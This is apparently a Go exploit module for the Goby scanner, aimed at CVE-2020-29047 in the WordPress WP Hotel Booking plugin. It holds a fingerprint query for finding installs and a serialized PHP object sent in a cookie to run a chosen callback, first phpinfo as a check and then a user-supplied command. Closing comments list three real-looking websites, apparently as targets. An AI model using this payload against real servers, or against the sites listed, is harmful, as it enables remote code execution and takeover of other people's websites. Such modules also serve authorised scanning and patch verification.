package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin WP Hotel Booking thimpress_hotel_booking_1 RCE Vulnerability (CVE-2020-29047)",
    "Description": "<p>WordPress Plugin WP Hotel Booking is a complete hotel booking plugin.</p><p>WordPress Plugin WP Hotel Booking version 1.10.2 has a code execution vulnerability, and attackers can execute malicious code to control the server.</p>",
    "Product": "wordpress-plugin-wp-hotel-booking",
    "Homepage": "https://wordpress.org/plugins/wp-hotel-booking/",
    "DisclosureDate": "2020-11-24",
    "Author": "h1ei1",
    "FofaQuery": "body=\"wp-content/plugins/wp-hotel-booking\"",
    "GobyQuery": "body=\"wp-content/plugins/wp-hotel-booking\"",
    "Level": "3",
    "Impact": "<p>WordPress Plugin WP Hotel Booking version 1.10.2 has a code execution vulnerability, and attackers can execute malicious code to control the server.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/wp-hotel-booking/.\">https://wordpress.org/plugins/wp-hotel-booking/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/e11265f5-39ed-4415-8376-4f092ef12003"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "phpinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "PHP Extension",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "PHP Version",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2020-29047"
    ],
    "CNNVD": [
        "CNNVD-202103-318"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress 插件 WP Hotel Booking thimpress_hotel_booking_1 参数远程代码执行漏洞（CVE-2020-29047）",
            "Product": "wordpress-plugin-wp-hotel-booking",
            "Description": "<p>WordPress Plugin WP Hotel Booking 是一款完整的酒店预订插件。<br></p><p>WordPress Plugin WP Hotel Booking 1.10.2版本存在代码执行漏洞，攻击者可执行恶意代码控制服务器。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/wp-hotel-booking/\">https://wordpress.org/plugins/wp-hotel-booking/</a>。<br></p>",
            "Impact": "<p>WordPress Plugin WP Hotel Booking 1.10.2版本存在代码执行漏洞，攻击者可执行恶意代码控制服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin WP Hotel Booking thimpress_hotel_booking_1 RCE Vulnerability (CVE-2020-29047)",
            "Product": "wordpress-plugin-wp-hotel-booking",
            "Description": "<p>WordPress Plugin WP Hotel Booking is a complete hotel booking plugin.<br></p><p>WordPress Plugin WP Hotel Booking version 1.10.2 has a code execution vulnerability, and attackers can execute malicious code to control the server.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/wp-hotel-booking/.\">https://wordpress.org/plugins/wp-hotel-booking/.</a><br></p>",
            "Impact": "<p>WordPress Plugin WP Hotel Booking version 1.10.2 has a code execution vulnerability, and attackers can execute malicious code to control the server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "thimpress_hotel_booking_1=O:11:\"WPHB_Logger\":1:{s:21:\"%00WPHB_Logger%00_handles\"%3BC:33:\"Requests_Utility_FilteredIterator\":67:{x:i:0%3Ba:1:{i:0%3Bs:2:\"-1\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:7:\"phpinfo\"%3B}}}")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PHP Extension") && strings.Contains(resp.RawBody, "PHP Version")

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("thimpress_hotel_booking_1=O:11:\"WPHB_Logger\":1:{s:21:\"%%00WPHB_Logger%%00_handles\"%%3BC:33:\"Requests_Utility_FilteredIterator\":67:{x:i:0%%3Ba:1:{i:0%%3Bs:2:\"-1\"%%3B}%%3Bm:a:1:{s:11:\"%%00*%%00callback\"%%3Bs:7:\"%s\"%%3B}}}", cmd))
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}

//https://blackpearlbelgrade.com
//https://hostal-lafont.com
//https://www.casagrandesoxal.com